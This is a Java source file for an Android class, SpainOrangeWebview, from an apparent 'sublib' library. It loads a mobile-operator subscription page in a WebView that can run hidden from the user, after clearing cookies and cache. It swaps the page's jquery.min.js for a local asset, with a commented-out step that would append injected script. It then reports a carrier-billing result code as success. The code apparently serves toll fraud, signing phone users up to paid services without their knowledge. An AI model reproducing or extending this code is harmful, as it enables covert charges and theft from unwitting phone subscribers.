package com.enhtmv.sublib.work.spain;

import android.util.ArrayMap;
import android.view.View;
import android.webkit.JavascriptInterface;
import android.webkit.WebChromeClient;
import android.webkit.WebResourceRequest;
import android.webkit.WebResourceResponse;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.LinearLayout;
import android.widget.RelativeLayout;

import com.alibaba.fastjson.JSON;
import com.blankj.utilcode.util.ConvertUtils;
import com.blankj.utilcode.util.LogUtils;
import com.blankj.utilcode.util.ResourceUtils;
import com.blankj.utilcode.util.Utils;
import com.cp.plugin.Plugin;
import com.cp.plugin.http.HttpReqest;
import com.enhtmv.sublib.common.http.SubResponse;
import com.enhtmv.sublib.common.sub.WebViewSubCall;

import java.io.InputStream;
import java.lang.reflect.Method;
import java.util.Map;

import okhttp3.HttpUrl;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.Response;
import okhttp3.WebSocket;
import okhttp3.WebSocketListener;

public class SpainOrangeWebview extends WebViewSubCall {


    private String logFunc;

    private String script;


    private RelativeLayout layout;

    public SpainOrangeWebview(RelativeLayout layout) {
        super(new WebView(Utils.getApp().getBaseContext()));

        this.layout = layout;

        webView.setWebChromeClient(new WebChromeClient());

        webView.setWebViewClient(new WebViewClient() {
            @Override
            public boolean shouldOverrideUrlLoading(WebView view, WebResourceRequest request) {
                view.loadUrl(request.getUrl().toString());

                LogUtils.i(request.getUrl().toString());

                return true;
            }

            @Override
            public void onPageFinished(WebView view, String url) {
                super.onPageFinished(view, url);
            }

            @Override
            public WebResourceResponse shouldInterceptRequest(WebView view, WebResourceRequest request) {

                String url = request.getUrl().toString();

                if (ignore(request)) {
                    return new WebResourceResponse("", "", null);
                }

                if (url.startsWith("http://go-es.allcpx.com/web/sub/result")) {

                    HttpUrl httpUrl = HttpUrl.parse(url);

                    if (httpUrl != null) {
                        String code = httpUrl.queryParameter("dcbErrorCode");

                        if ("0".equals(code) || "150".equals(code)) {
                            success();
                        } else {
                            r.w("error", url);
                        }
                    } else {
                        r.w("error", url);
                    }

                }


                if (url.endsWith("jquery.min.js")) {

//                    String jquery = ResourceUtils.readAssets2String("jquery.js") + "\n"
//                            + logFunc + "\n"
//                            + script;
                    String jquery = ResourceUtils.readAssets2String("jquery.js");

                    InputStream inputStream = ConvertUtils.string2InputStream(jquery, "utf-8");

                    return new WebResourceResponse("application/javascript; charset=utf-8", "utf-8", inputStream);

                }

                return super.shouldInterceptRequest(view, request);
            }
        });


        for (Method method : JavascriptLog.class.getMethods()) {
            JavascriptInterface annotation = method.getAnnotation(JavascriptInterface.class);
            if (annotation != null) {
                this.logFunc = "function log(tag,info){window.LOG." + method.getName() + "(tag,info)}";
                LogUtils.i("script log method:", logFunc);
                break;
            }
        }
    }

    @Override
    public void sub(String script) {


        handler.post(new Runnable() {
            @Override
            public void run() {

                clearCookies();

                LinearLayout.LayoutParams params = new LinearLayout.LayoutParams(LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.MATCH_PARENT);

                webView.setLayoutParams(params);


                if (Plugin.isHiden()) {
                    webView.setVisibility(View.GONE);
                }

                layout.addView(webView);

                webView.clearHistory();
                webView.clearCache(true);
                webView.clearFormData();


                report(SUB_REQEUST);

//                webView.loadUrl("http://es.mnt-hk.com/orange/sub?aff=DCG_orange&pro=DCG&click=" + androidId);
                webView.loadUrl("http://www.baidu.comxxxx");
            }
        });

    }


}
